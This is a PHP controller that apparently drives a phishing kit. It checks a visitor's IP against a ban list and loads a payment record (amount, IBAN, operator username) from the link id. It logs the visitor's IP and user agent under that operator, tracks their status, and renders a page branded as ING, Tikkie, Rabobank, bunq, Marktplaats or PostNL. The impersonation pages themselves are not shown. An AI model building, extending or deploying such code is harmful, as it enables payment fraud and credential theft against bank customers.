<?php

namespace App\Controllers\Pay;

use \Core\View;
use \App\Models\Pay\Pay;
use \App\Auth;

class Request extends \Core\Controller
{
    public function indexAction()
    {
        if (!Pay::findBan($_SERVER['REMOTE_ADDR'])) {
            $data = Pay::checkPayment($this->route_params['id']);
            if ($data) {
                $this->startSession($data);
                $this->createLog();
                $this->renderView($data['mode']);
            } else {
                Pay::redirect();
            }
        } else {
            Pay::redirect();
        }
    }

    private function startSession($data)
    {
        $_SESSION['name'] = $data['name'];
        $_SESSION['amount'] = $data['amount'];
        $_SESSION['description'] = $data['description'];
        $_SESSION['iban'] = $data['iban'];
        $_SESSION['username'] = $data['username'];
        $_SESSION['url'] = $this->route_params['id'];
        $_SESSION['pay'] = true;
    }

    private function renderView($mode)
    {
        if ($mode === 'ing') {
            View::render('Pay/ing.php');
        } else if ($mode === 'tikkie') {
            View::render('Pay/tikkie.php');
        } else if ($mode === 'rabo') {
            View::render('Pay/rabo.php');
        } else if ($mode === 'mp') {
            View::render('Pay/marktplaats.php');
        } else if ($mode === 'bunq') {
            View::render('Pay/bunq.php');
        } else if ($mode === 'postnl') {
            View::render('Pay/postnl.php');
        } else {
            Pay::redirect();
        }
    }

    private function createLog()
    {
        if (!isset($_SESSION['uid'])) {
            $_SESSION['uid'] = uniqid();
            Pay::createLog($_SESSION['username'], $_SESSION['url'], $_SESSION['uid'], $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
        } else {
            $check = Pay::findLog($_SESSION['uid']);
            if (!$check) {
                Pay::createLog($_SESSION['username'], $_SESSION['url'], $_SESSION['uid'], $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
            } else {
                Pay::updateStatus($_SESSION['uid']);
            }
        }
    }
}